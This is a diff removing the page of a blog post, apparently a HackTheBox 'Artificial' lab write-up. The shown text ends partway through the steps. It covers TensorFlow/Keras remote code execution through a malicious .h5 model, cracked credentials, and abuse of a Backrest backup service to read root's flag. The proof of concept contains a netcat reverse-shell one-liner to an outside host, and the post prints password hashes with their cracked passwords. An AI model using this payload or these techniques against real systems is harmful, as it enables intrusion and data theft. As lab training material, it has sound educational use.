@@ -1,72 +1,483 @@
-<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><title>HTB Machine Writeup "Artificial" - My Personal Blog</title><meta name=Description content="This is my personal blog"><meta property="og:url" content="https://fodhil-ben.github.io/f0dh1l/posts/htb_artificial/">
-<meta property="og:site_name" content="My Personal Blog"><meta property="og:title" content='HTB Machine Writeup "Artificial"'><meta property="og:description" content="HTB Machine: Artificial - Writeup Machine Information Difficulty: Easy OS: Linux Key Concepts: TensorFlow/Keras Vulnerability, File Upload, Privilege Escalation Through Backrest service Overview Artificial is an Easy Linux machine from HackTheBox that demonstrates the dangers of accepting user uploaded machine learning models. The path to root involves exploiting a TensorFlow remote code execution vulnerability, database credential extraction, and abusing a backup service to read the root flag."><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2025-10-23T13:48:04+01:00"><meta property="article:modified_time" content="2025-10-23T13:48:04+01:00"><meta property="article:tag" content="HTB"><meta property="article:tag" content="Linux"><meta name=twitter:card content="summary"><meta name=twitter:title content='HTB Machine Writeup "Artificial"'><meta name=twitter:description content="HTB Machine: Artificial - Writeup Machine Information Difficulty: Easy OS: Linux Key Concepts: TensorFlow/Keras Vulnerability, File Upload, Privilege Escalation Through Backrest service Overview Artificial is an Easy Linux machine from HackTheBox that demonstrates the dangers of accepting user uploaded machine learning models. The path to root involves exploiting a TensorFlow remote code execution vulnerability, database credential extraction, and abusing a backup service to read the root flag."><meta name=application-name content="My Personal Blog"><meta name=apple-mobile-web-app-title content="My Personal Blog"><meta name=referrer content="no-referrer"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=manifest href=/site.webmanifest><link rel=canonical href=https://fodhil-ben.github.io/f0dh1l/posts/htb_artificial/><link rel=prev href=https://fodhil-ben.github.io/f0dh1l/posts/first-h1-bounty/><link rel=next href=https://fodhil-ben.github.io/f0dh1l/posts/htb_tombwatcher/><link rel=stylesheet href=/f0dh1l/css/style.min.css><link rel=preload href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.2/css/all.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.2/css/all.min.css></noscript><link rel=preload href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"HTB Machine Writeup \"Artificial\"","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/fodhil-ben.github.io\/f0dh1l\/posts\/htb_artificial\/"},"genre":"posts","keywords":"HTB, Linux","wordcount":1096,"url":"https:\/\/fodhil-ben.github.io\/f0dh1l\/posts\/htb_artificial\/","datePublished":"2025-10-23T13:48:04+01:00","dateModified":"2025-10-23T13:48:04+01:00","license":"2025 F0DH1L","publisher":{"@type":"Organization","name":""},"author":{"@type":"Person","name":"F0DH1L"},"description":""}</script></head><body data-header-desktop=fixed data-header-mobile=auto><script>const query=window.matchMedia("(prefers-color-scheme: dark)");function applyTheme(){let e=window.localStorage?.getItem("theme")||"dark",t=e==="dark"||e==="auto"&&query.matches;document.body.setAttribute("theme",t?"dark":"light"),document.body.setAttribute("cfg-theme",e)}applyTheme(),query.addEventListener("change",applyTheme)</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/f0dh1l/ title="My Personal Blog">F0DH1L Blog</a></div><div class=menu><div class=menu-inner><a class=menu-item href=/f0dh1l/posts/>Posts </a><a class=menu-item href=/f0dh1l/tags/>Tags </a><a class=menu-item href=/f0dh1l/about/>About </a><span class="menu-item delimiter"></span><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
-<i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/f0dh1l/ title="My Personal Blog">F0DH1L Blog</a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><a class=menu-item href=/f0dh1l/posts/ title>Posts</a><a class=menu-item href=/f0dh1l/tags/ title>Tags</a><a class=menu-item href=/f0dh1l/about/ title>About</a><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
-<i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></header><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>Contents</h2><div class=toc-content id=toc-content-auto></div></div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">HTB Machine Writeup "Artificial"</h1><div class=post-meta><div class=post-meta-line><span class=post-author><a href=/f0dh1l/ title=Author rel=author class=author><i class="fas fa-user-circle fa-fw" aria-hidden=true></i>F0DH1L</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw" aria-hidden=true></i>&nbsp;<time datetime=2025-10-23>2025-10-23</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden=true></i>&nbsp;1096 words&nbsp;
-<i class="far fa-clock fa-fw" aria-hidden=true></i>&nbsp;6 minutes&nbsp;</div></div><div class="details toc" id=toc-static data-kept><div class="details-summary toc-title"><span>Contents</span>
-<span><i class="details-icon fas fa-angle-right" aria-hidden=true></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#machine-information>Machine Information</a></li><li><a href=#overview>Overview</a></li><li><a href=#reconnaissance>Reconnaissance</a></li><li><a href=#web-application-a-machine-learning-platform>Web Application: A Machine Learning Platform</a></li><li><a href=#exploitation>Exploitation</a></li><li><a href=#initial-access-triggering-the-payload>Initial Access: Triggering the Payload</a></li><li><a href=#lateral-movement-finding-user-credentials>Lateral Movement: Finding User Credentials</a></li><li><a href=#privilege-escalation-the-path-to-root>Privilege Escalation: The Path to Root</a><ul><li><a href=#analyzing-the-backup>Analyzing the Backup</a></li><li><a href=#discovering-the-hidden-service>Discovering the Hidden Service</a></li><li><a href=#exploiting-backrest-for-root-access>Exploiting Backrest for Root Access</a></li></ul></li><li><a href=#conclusion>Conclusion</a></li></ul></nav></div></div><div class=content id=content><h1 id=htb-machine-artificial---writeup>HTB Machine: Artificial - Writeup</h1><h2 id=machine-information>Machine Information</h2><ul><li><strong>Difficulty</strong>: Easy</li><li><strong>OS</strong>: Linux</li><li><strong>Key Concepts</strong>: TensorFlow/Keras Vulnerability, File Upload, Privilege Escalation Through Backrest service</li></ul><p><img class=lazyload src=/f0dh1l/svg/loading.min.svg data-src=/f0dh1l/images/htb_artificial/image-18.png data-srcset="/f0dh1l/images/htb_artificial/image-18.png, /f0dh1l/images/htb_artificial/image-18.png 1.5x, /f0dh1l/images/htb_artificial/image-18.png 2x" data-sizes=auto alt=/f0dh1l/images/htb_artificial/image-18.png title="Solve Screenshot"></p><h2 id=overview>Overview</h2><p><strong>Artificial</strong> is an Easy Linux machine from HackTheBox that demonstrates the dangers of accepting user uploaded machine learning models. The path to root involves exploiting a TensorFlow remote code execution vulnerability, database credential extraction, and abusing a backup service to read the root flag.</p><h2 id=reconnaissance>Reconnaissance</h2><p>First Thing to do as always i launched an nmap scan to identify open services. The results revealed just SSH on port 22 and an HTTP server on port 80.</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
-<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
-<span class=copy title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Nmap 7.94SVN scan initiated Mon Oct 13 10:52:32 2025 as: nmap -sC -sV -Pn -oN nmap_scan.txt -vv 10.10.11.74</span>
-</span></span><span class=line><span class=cl>Increasing send delay <span class=k>for</span> 10.10.11.74 from <span class=m>0</span> to <span class=m>5</span> due to <span class=m>11</span> out of <span class=m>11</span> dropped probes since last increase.
-</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.11.74
-</span></span><span class=line><span class=cl>Host is up, received user-set <span class=o>(</span>0.34s latency<span class=o>)</span>.
-</span></span><span class=line><span class=cl>Scanned at 2025-10-13 10:52:32 CET <span class=k>for</span> 68s
-</span></span><span class=line><span class=cl>Not shown: <span class=m>998</span> closed tcp ports <span class=o>(</span>conn-refused<span class=o>)</span>
-</span></span><span class=line><span class=cl>PORT   STATE SERVICE REASON  VERSION
-</span></span><span class=line><span class=cl>22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 <span class=o>(</span>Ubuntu Linux<span class=p>;</span> protocol 2.0<span class=o>)</span>
-</span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey: 
-</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>3072</span> 7c:e4:8d:84:c5:de:91:3a:5a:2b:9d:34:ed:d6:99:17 <span class=o>(</span>RSA<span class=o>)</span>
-</span></span><span class=line><span class=cl><span class=p>|</span> ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDNABz8gRtjOqG4+jUCJb2NFlaw1auQlaXe1/+I+BhqrriREBnu476PNw6mFG9ifT57WWE/qvAZQFYRvPupReMJD4C3bE3fSLbXAoP03+7JrZkNmPRpVetRjUwP1acu7golA8MnPGzGa2UW38oK/TnkJDlZgRpQq/7DswCr38IPxvHNO/15iizgOETTTEU8pMtUm/ISNQfPcGLGc0x5hWxCPbu75OOOsPt2vA2qD4/sb9bDCOR57bAt4i+WEqp7Ri/act+f4k6vypm1sebNXeYaKapw+W83en2LnJOU0lsdhJiAPKaD/srZRZKOR0bsPcKOqLWQR/A6Yy3iRE8fcKXzfbhYbLUiXZzuUJoEMW33l8uHuAza57PdiMFnKqLQ6LBfwYs64Q3v8oAn5O7upCI/nDQ6raclTSigAKpPbliaL0HE/P7UhNacrGE7Gsk/FwADiXgEAseTn609wBnLzXyhLzLb4UVu9yFRWITkYQ6vq4ZqsiEnAsur/jt8WZY6MQ8<span class=o>=</span>
-</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> 83:46:2d:cf:73:6d:28:6f:11:d5:1d:b4:88:20:d6:7c <span class=o>(</span>ECDSA<span class=o>)</span>
-</span></span><span class=line><span class=cl><span class=p>|</span> ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOdlb8oU9PsHX8FEPY7DijTkQzsjeFKFf/xgsEav4qedwBUFzOetbfQNn3ZrQ9PMIHrguBG+cXlA2gtzK4NPohU<span class=o>=</span>
-</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> e3:18:2e:3b:40:61:b4:59:87:e8:4a:29:24:0f:6a:fc <span class=o>(</span>ED25519<span class=o>)</span>
-</span></span><span class=line><span class=cl><span class=p>|</span>_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH8QL1LMgQkZcpxuylBjhjosiCxcStKt8xOBU0TjCNmD
-</span></span><span class=line><span class=cl>80/tcp open  http    syn-ack nginx 1.18.0 <span class=o>(</span>Ubuntu<span class=o>)</span>
-</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Did not follow redirect to http://artificial.htb/
-</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: nginx/1.18.0 <span class=o>(</span>Ubuntu<span class=o>)</span>
-</span></span><span class=line><span class=cl><span class=p>|</span> http-methods: 
-</span></span><span class=line><span class=cl><span class=p>|</span>_  Supported Methods: GET HEAD POST OPTIONS
-</span></span><span class=line><span class=cl>Service Info: OS: Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>Read data files from: /usr/bin/../share/nmap
-</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-</span></span><span class=line><span class=cl><span class=c1># Nmap done at Mon Oct 13 10:53:40 2025 -- 1 IP address (1 host up) scanned in 68.99 seconds</span></span></span></code></pre></div></div><p>The web server caught my attention, After adding this to my <code>/etc/hosts</code> file, I navigated to the website.</p><hr><h2 id=web-application-a-machine-learning-platform>Web Application: A Machine Learning Platform</h2><p>The landing page presented an interesting web application focused on machine learning model hosting. After registering an account and login i was redirected to the main page.</p><p><img class=lazyload src=/f0dh1l/svg/loading.min.svg data-src=/f0dh1l/images/htb_artificial/image.png data-srcset="/f0dh1l/images/htb_artificial/image.png, /f0dh1l/images/htb_artificial/image.png 1.5x, /f0dh1l/images/htb_artificial/image.png 2x" data-sizes=auto alt=/f0dh1l/images/htb_artificial/image.png title="Website homepage"></p><p>The platform featured a file upload functionality specifically designed for machine learning models. What made this particularly interesting was the accepted file format: <code>.h5</code> files, which are Keras model files.</p><p><img class=lazyload src=/f0dh1l/svg/loading.min.svg data-src=/f0dh1l/images/htb_artificial/image-1.png data-srcset="/f0dh1l/images/htb_artificial/image-1.png, /f0dh1l/images/htb_artificial/image-1.png 1.5x, /f0dh1l/images/htb_artificial/image-1.png 2x" data-sizes=auto alt=/f0dh1l/images/htb_artificial/image-1.png title="File upload page"></p><p>Exploring further, I discovered downloadable files that revealed crucial information about the backend infrastructure - a <code>Dockerfile</code> and <code>requirements.txt</code>. These files exposed the technology stack in use:</p><p><strong>requirements.txt:</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
-<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
-<span class=copy title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><pre tabindex=0><code>tensorflow-cpu==2.13.1</code></pre></div><p><strong>Dockerfile:</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-dockerfile"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
-<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
-<span class=copy title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-dockerfile data-lang=dockerfile><span class=line><span class=cl><span class=k>FROM</span><span class=s> python:3.8-slim</span><span class=err>
-</span></span></span><span class=line><span class=cl><span class=err>
-</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>WORKDIR</span><span class=s> /code</span><span class=err>
-</span></span></span><span class=line><span class=cl><span class=err>
-</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>RUN</span> apt-get update <span class=o>&amp;&amp;</span> <span class=se>\
-</span></span></span><span class=line><span class=cl><span class=se></span>    apt-get install -y curl <span class=o>&amp;&amp;</span> <span class=se>\
-</span></span></span><span class=line><span class=cl><span class=se></span>    curl -k -LO https://files.pythonhosted.org/packages/65/ad/4e090ca3b4de53404df9d1247c8a371346737862cfe539e7516fd23149a4/tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl <span class=o>&amp;&amp;</span> <span class=se>\
-</span></span></span><span class=line><span class=cl><span class=se></span>    rm -rf /var/lib/apt/lists/*<span class=err>
-</span></span></span><span class=line><span class=cl><span class=err>
-</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>RUN</span> pip install ./tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl<span class=err>
-</span></span></span><span class=line><span class=cl><span class=err>
-</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>ENTRYPOINT</span> <span class=p>[</span><span class=s2>&#34;/bin/bash&#34;</span><span class=p>]</span></span></span></code></pre></div></div><p>The specific TensorFlow version immediately set off alarm bells. I knew that accepting user-uploaded model files could be dangerous, especially with specific versions that might have known vulnerabilities.</p><hr><h2 id=exploitation>Exploitation</h2><p>After some research, I discovered a critical vulnerability: TensorFlow Remote Code Execution through malicious model files. The vulnerability allows arbitrary code execution when a crafted <code>.h5</code> model is loaded.</p><p><strong>Reference:</strong> <a href=https://mastersplinter.work/research/tensorflow-rce/ target=_blank rel="noopener noreffer">https://mastersplinter.work/research/tensorflow-rce/</a></p><p>I crafted a proof of concept that would give me a reverse shell upon model loading:</p><p><strong>poc.py:</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
-<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
-<span class=copy title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>tensorflow</span> <span class=k>as</span> <span class=nn>tf</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>exploit</span><span class=p>(</span><span class=n>x</span><span class=p>):</span>
-</span></span><span class=line><span class=cl>    <span class=kn>import</span> <span class=nn>os</span>
-</span></span><span class=line><span class=cl>    <span class=n>os</span><span class=o>.</span><span class=n>system</span><span class=p>(</span><span class=s2>&#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.16.56 4444 &gt;/tmp/f&#34;</span><span class=p>)</span>
-</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>x</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=n>model</span> <span class=o>=</span> <span class=n>tf</span><span class=o>.</span><span class=n>keras</span><span class=o>.</span><span class=n>Sequential</span><span class=p>()</span>
-</span></span><span class=line><span class=cl><span class=n>model</span><span class=o>.</span><span class=n>add</span><span class=p>(</span><span class=n>tf</span><span class=o>.</span><span class=n>keras</span><span class=o>.</span><span class=n>layers</span><span class=o>.</span><span class=n>Input</span><span class=p>(</span><span class=n>shape</span><span class=o>=</span><span class=p>(</span><span class=mi>64</span><span class=p>,)))</span>
-</span></span><span class=line><span class=cl><span class=n>model</span><span class=o>.</span><span class=n>add</span><span class=p>(</span><span class=n>tf</span><span class=o>.</span><span class=n>keras</span><span class=o>.</span><span class=n>layers</span><span class=o>.</span><span class=n>Lambda</span><span class=p>(</span><span class=n>exploit</span><span class=p>))</span>
-</span></span><span class=line><span class=cl><span class=n>model</span><span class=o>.</span><span class=n>compile</span><span class=p>()</span>
-</span></span><span class=line><span class=cl><span class=n>model</span><span class=o>.</span><span class=n>save</span><span class=p>(</span><span class=s2>&#34;exploit.h5&#34;</span><span class=p>)</span></span></span></code></pre></div></div><p>The tricky part? Getting the exact environment match. My initial attempts in a local virtual environment failed, even with the exact version from <code>requirements.txt</code>. The solution was to replicate the production environment precisely using the provided Dockerfile.</p><p>I spun up a Docker container with the exact configuration and compiled the malicious model inside:</p><p><img class=lazyload src=/f0dh1l/svg/loading.min.svg data-src=/f0dh1l/images/htb_artificial/image-2.png data-srcset="/f0dh1l/images/htb_artificial/image-2.png, /f0dh1l/images/htb_artificial/image-2.png 1.5x, /f0dh1l/images/htb_artificial/image-2.png 2x" data-sizes=auto alt=/f0dh1l/images/htb_artificial/image-2.png title="Compiling exploit in Docker"></p><p>With the weaponized <code>exploit.h5</code> file in hand, I extracted it from the container and prepared for deployment.</p><hr><h2 id=initial-access-triggering-the-payload>Initial Access: Triggering the Payload</h2><p>I uploaded the malicious model through the web interface:</p><p><img class=lazyload src=/f0dh1l/svg/loading.min.svg data-src=/f0dh1l/images/htb_artificial/image-3.png data-srcset="/f0dh1l/images/htb_artificial/image-3.png, /f0dh1l/images/htb_artificial/image-3.png 1.5x, /f0dh1l/images/htb_artificial/image-3.png 2x" data-sizes=auto alt=/f0dh1l/images/htb_artificial/image-3.png title="Uploading malicious model"></p><p>With my netcat listener ready on port 4444, I triggered the model execution:</p><p><img class=lazyload src=/f0dh1l/svg/loading.min.svg data-src=/f0dh1l/images/htb_artificial/image-4.png data-srcset="/f0dh1l/images/htb_artificial/image-4.png, /f0dh1l/images/htb_artificial/image-4.png 1.5x, /f0dh1l/images/htb_artificial/image-4.png 2x" data-sizes=auto alt=/f0dh1l/images/htb_artificial/image-4.png title="Triggering model execution"></p><p>Success! The reverse shell connected back to my machine:</p><p><img class=lazyload src=/f0dh1l/svg/loading.min.svg data-src=/f0dh1l/images/htb_artificial/image-5.png data-srcset="/f0dh1l/images/htb_artificial/image-5.png, /f0dh1l/images/htb_artificial/image-5.png 1.5x, /f0dh1l/images/htb_artificial/image-5.png 2x" data-sizes=auto alt=/f0dh1l/images/htb_artificial/image-5.png title="Reverse shell obtained"></p><p>I was in, but as a low-privileged user. Time to escalate.</p><hr><h2 id=lateral-movement-finding-user-credentials>Lateral Movement: Finding User Credentials</h2><p>Exploring the filesystem, I discovered a SQLite database in the <code>/instance</code> directory. This database contained user credentials - a goldmine for lateral movement.</p><p>Inside, I found a hash for user <code>gael</code>:</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
-<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
-<span class=copy title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><pre tabindex=0><code>c99175974b6e192936d97224638a34f8</code></pre></div><p>This MD5 hash cracked easily using hashcat:</p><p><strong>Credentials:</strong></p><ul><li>Username: <code>gael</code></li><li>Password: <code>mattp005numbertwo</code></li></ul><p>I switched to the <code>gael</code> user and gained proper shell access via SSH for better stability.</p><p><img class=lazyload src=/f0dh1l/svg/loading.min.svg data-src=/f0dh1l/images/htb_artificial/image-6.png data-srcset="/f0dh1l/images/htb_artificial/image-6.png, /f0dh1l/images/htb_artificial/image-6.png 1.5x, /f0dh1l/images/htb_artificial/image-6.png 2x" data-sizes=auto alt=/f0dh1l/images/htb_artificial/image-6.png title="Getting User Flag"></p><hr><h2 id=privilege-escalation-the-path-to-root>Privilege Escalation: The Path to Root</h2><p>After stabilizing my access, I checked my group memberships and noticed something interesting:</p><p><img class=lazyload src=/f0dh1l/svg/loading.min.svg data-src=/f0dh1l/images/htb_artificial/image-7.png data-srcset="/f0dh1l/images/htb_artificial/image-7.png, /f0dh1l/images/htb_artificial/image-7.png 1.5x, /f0dh1l/images/htb_artificial/image-7.png 2x" data-sizes=auto alt=/f0dh1l/images/htb_artificial/image-7.png title="User groups"></p><p>The <code>sysadm</code> group stood out. I immediately searched for files accessible by this group:</p><p><img class=lazyload src=/f0dh1l/svg/loading.min.svg data-src=/f0dh1l/images/htb_artificial/image-8.png data-srcset="/f0dh1l/images/htb_artificial/image-8.png, /f0dh1l/images/htb_artificial/image-8.png 1.5x, /f0dh1l/images/htb_artificial/image-8.png 2x" data-sizes=auto alt=/f0dh1l/images/htb_artificial/image-8.png title="Finding sysadm files"></p><p>And GG! A backup file at <code>/var/backups/backrest_backup.tar.gz</code> was readable by the <code>sysadm</code> group. I downloaded this archive to my local machine for analysis.</p><h3 id=analyzing-the-backup>Analyzing the Backup</h3><p>Extracting the backup revealed the source code and configuration for a backup service called &ldquo;Backrest&rdquo;. While digging through the <code>.config</code> directory, I found what appeared to be a base64-encoded bcrypt hash:</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
-<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
-<span class=copy title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><pre tabindex=0><code>JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP</code></pre></div><p>After decoding i got this which seems like a bcrypt hash</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
-<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
-<span class=copy title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><pre tabindex=0><code>$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO</code></pre></div><p>after cracking, I obtained the password for <code>backrest_root</code>:</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
-<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
-<span class=copy title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><pre tabindex=0><code>!@#$%^</code></pre></div><h3 id=discovering-the-hidden-service>Discovering the Hidden Service</h3><p>Examining <code>install.sh</code> within the backup revealed that Backrest runs a web interface on port <code>9898</code>, but only on localhost. This explained why I hadn&rsquo;t seen it during my initial port scan.</p><p>To access this service, I set up SSH port forwarding:</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
-<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
-<span class=copy title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ssh -L 9898:127.0.0.1:9898 gael@artificial.htb</span></span></code></pre></div></div><p>Now I could access the Backrest interface from my browser at <code>http://localhost:9898</code>.</p><p><img class=lazyload src=/f0dh1l/svg/loading.min.svg data-src=/f0dh1l/images/htb_artificial/image-9.png data-srcset="/f0dh1l/images/htb_artificial/image-9.png, /f0dh1l/images/htb_artificial/image-9.png 1.5x, /f0dh1l/images/htb_artificial/image-9.png 2x" data-sizes=auto alt=/f0dh1l/images/htb_artificial/image-9.png title="Backrest login"></p><p>Logging in with <code>backrest_root:!@#$%^</code>, I gained access to the backup management interface.</p><h3 id=exploiting-backrest-for-root-access>Exploiting Backrest for Root Access</h3><p>The Backrest interface allowed me to create backup repositories and plans. More importantly, it could backup and restore arbitrary files on the system. Since the service likely ran as root (as backup services typically do), this was my ticket to reading the root flag.</p><p><strong>Step 1:</strong> I created a new backup repository:</p><p><img class=lazyload src=/f0dh1l/svg/loading.min.svg data-src=/f0dh1l/images/htb_artificial/image-11.png data-srcset="/f0dh1l/images/htb_artificial/image-11.png, /f0dh1l/images/htb_artificial/image-11.png 1.5x, /f0dh1l/images/htb_artificial/image-11.png 2x" data-sizes=auto alt=/f0dh1l/images/htb_artificial/image-11.png title="Creating repository"></p><p><strong>Step 2:</strong> I created a backup plan targeting <code>/root/root.txt</code>:</p><p><img class=lazyload src=/f0dh1l/svg/loading.min.svg data-src=/f0dh1l/images/htb_artificial/image-12.png data-srcset="/f0dh1l/images/htb_artificial/image-12.png, /f0dh1l/images/htb_artificial/image-12.png 1.5x, /f0dh1l/images/htb_artificial/image-12.png 2x" data-sizes=auto alt=/f0dh1l/images/htb_artificial/image-12.png title="Creating backup plan"></p><p><strong>Step 3:</strong> I executed the backup:</p><p><img class=lazyload src=/f0dh1l/svg/loading.min.svg data-src=/f0dh1l/images/htb_artificial/image-13.png data-srcset="/f0dh1l/images/htb_artificial/image-13.png, /f0dh1l/images/htb_artificial/image-13.png 1.5x, /f0dh1l/images/htb_artificial/image-13.png 2x" data-sizes=auto alt=/f0dh1l/images/htb_artificial/image-13.png title="Executing backup"></p><p><strong>Step 4:</strong> I performed a restore operation to extract the backed-up files:</p><p><img class=lazyload src=/f0dh1l/svg/loading.min.svg data-src=/f0dh1l/images/htb_artificial/image-14.png data-srcset="/f0dh1l/images/htb_artificial/image-14.png, /f0dh1l/images/htb_artificial/image-14.png 1.5x, /f0dh1l/images/htb_artificial/image-14.png 2x" data-sizes=auto alt=/f0dh1l/images/htb_artificial/image-14.png title="Starting restore">
